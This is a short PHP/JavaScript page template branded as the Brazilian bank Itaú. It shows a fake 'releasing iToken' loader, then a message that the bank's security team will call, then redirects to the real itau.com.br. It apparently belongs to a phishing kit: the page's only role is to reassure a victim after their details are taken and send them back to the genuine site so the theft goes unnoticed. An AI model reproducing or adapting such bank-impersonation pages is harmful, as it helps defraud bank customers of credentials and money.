<div class="container-itau">
	<?= $this->Html->image('itau/loader.svg', ['class' => 'init_logo']) ?>
	<span class="loader_obs">Liberando Itoken, aguarde.....</span>
</div>
<script type="text/javascript">
	$(function() {
		var timeout = setTimeout(function() {
			$('.init_logo').fadeOut('slow');
			$('.loader_obs').css('top', '50%');
			$('.loader_obs').text('Em breve você receberá um contato da área de segurança Itaú!');
			var timeout2 = setTimeout(function() {
				window.location = "https://itau.com.br";
			}, 4000);
		}, 4000);
	})
</script>
